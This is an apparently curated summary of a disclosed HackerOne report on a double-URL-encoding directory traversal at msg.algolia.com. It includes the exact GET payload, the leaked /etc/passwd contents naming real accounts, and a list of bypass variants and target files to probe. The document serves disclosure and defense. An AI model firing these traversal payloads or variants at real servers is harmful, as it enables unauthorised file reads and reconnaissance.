# Directory Traversal via Double URL Encoding at msg.algolia.com

## Metadata
- **Source:** HackerOne
- **Report:** 333306 | https://hackerone.com/reports/333306
- **Submitted:** 2018-04-04
- **Reporter:** n00bsec
- **Program:** Algolia
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Path Traversal, Directory Traversal, Inadequate Input Validation, Improper URL Decoding
- **CVEs:** None
- **Category:** uncategorised

## Summary
An attacker could access sensitive files on the server by exploiting a directory traversal vulnerability using double URL-encoded traversal sequences (%252f represents ../) at the /static/ endpoint. The application failed to properly validate and sanitize user-controlled path parameters, allowing an unauthenticated attacker to read arbitrary files including /etc/passwd containing system user credentials.

## Attack scenario
1. Attacker identifies the msg.algolia.com domain and notes the /static/ endpoint is accessible without authentication
2. Attacker crafts a request using double URL-encoded traversal sequences (%252f%252f%252f...) to bypass basic path traversal filters
3. First URL decoding converts %252f to %2f (encoded forward slash), bypassing initial validation
4. Second decoding layer converts %2f to / (forward slash), allowing actual directory traversal
5. Attacker requests GET /static/..%252f..%252f..%252f..%252f..%252fetc/passwd to traverse to the root filesystem
6. Server returns HTTP 200 with plaintext /etc/passwd contents, revealing system user accounts and shell configurations

## Root cause
The application implemented insufficient input validation on the /static/ endpoint. The server likely decoded URL parameters only once or had filtering logic that checked for ../sequences before proper decoding, failing to account for double-encoded payloads. Additionally, there was no restriction on path traversal or validation that requested paths remain within intended directories.

## Attacker mindset
Reconnaissance and information gathering. The attacker systematically tested directory traversal techniques, discovering that double URL encoding bypassed the filtering mechanism. With successful /etc/passwd access, they could identify valid system users and potential credential attack vectors, gathering intelligence for lateral movement or privilege escalation.

## Defensive takeaways
- Implement recursive URL decoding until no further decoding occurs, or whitelist acceptable decoded characters
- Use a canonical path representation after decoding and verify it stays within the intended base directory
- Never rely solely on blacklist filtering for path traversal; use whitelist-based path validation
- Implement strict input validation before any filesystem operations; reject requests containing ../, .., or encoded variations
- Apply principle of least privilege; restrict web server process to minimal required filesystem access
- Use chroot jails or containerization to limit filesystem exposure
- Disable directory listing and serve only intended static files from a dedicated directory
- Implement Web Application Firewall (WAF) rules to detect and block path traversal patterns
- Add security headers and monitoring to detect suspicious file access patterns
- Conduct regular security audits and penetration testing of file serving endpoints

## Variant hunting
Test triple URL encoding (%25252f) on other endpoints
Probe alternative traversal sequences: ..\..\, ..;/, unicode encodings (\u002e%u002e%u002f)
Attempt path traversal on other static content domains (cdn.algolia.com, static.algolia.com)
Test with null byte injection (/etc/passwd%00.jpg) on older systems
Try case variation bypasses (...%2f, ..%5c on Windows systems)
Check if other Algolia subdomains expose sensitive files or configuration
Test for arbitrary file upload combined with path traversal
Attempt to read application configuration files (.env, config.php, web.config)

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1083 - File and Directory Discovery
- T1552.001 - Unsecured Credentials - Credentials In Files
- T1217 - Browser Information Discovery
- T1526 - Scan IP Blocks

## Notes
The vulnerability demonstrates classic directory traversal exploitation where encoding bypass techniques circumvent incomplete input sanitization. The response header indicates Cloudflare was in use, suggesting the vulnerability existed in the origin server despite CDN presence. The disclosure of /etc/passwd is particularly concerning as it reveals system user accounts including non-service accounts (ubuntu, eranchetz) which could be targets for brute-force attacks.

## Full report
<details><summary>Expand</summary>

Hi,
I was able to view the internal server files at https://msg.algolia.com.
Please see the attached screenshots for proof.
I have tried to reproduce from within firefox and internet explorer without much luck however if you need it I will try to come up with a work around.
For reference the response header is as follows:
--------------------------------------------------------------------------
HTTP/1.1 200 OK
Date: Wed, 04 Apr 2018 04:58:25 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Last-Modified: Tue, 06 Jun 2017 09:15:37 GMT
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4061331ffd53aa7a-SIN
Content-Length: 1696
-------------------------------------------------------------------------------------
And here request to view directory traversal
GET /static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: msg.algolia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __cfduid=d34587d94eba9413080d1f7aca5062a871522817854
Connection: close
Upgrade-Insecure-Requests: 1

Response:

HTTP/1.1 200 OK
Date: Wed, 04 Apr 2018 04:58:25 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Last-Modified: Tue, 06 Jun 2017 09:15:37 GMT
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4061331ffd53aa7a-SIN
Content-Length: 1696

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
lxd:x:107:65534::/var/lib/lxd/:/bin/false
uuidd:x:108:113::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ntp:x:112:116::/home/ntp:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
eranchetz:x:1001:1002::/home/eranchetz:/bin/bash

## Impact

we can see sensitive information (ex. /etc/passwd) file

</details>

---
*Analysed by Claude on 2026-05-24*
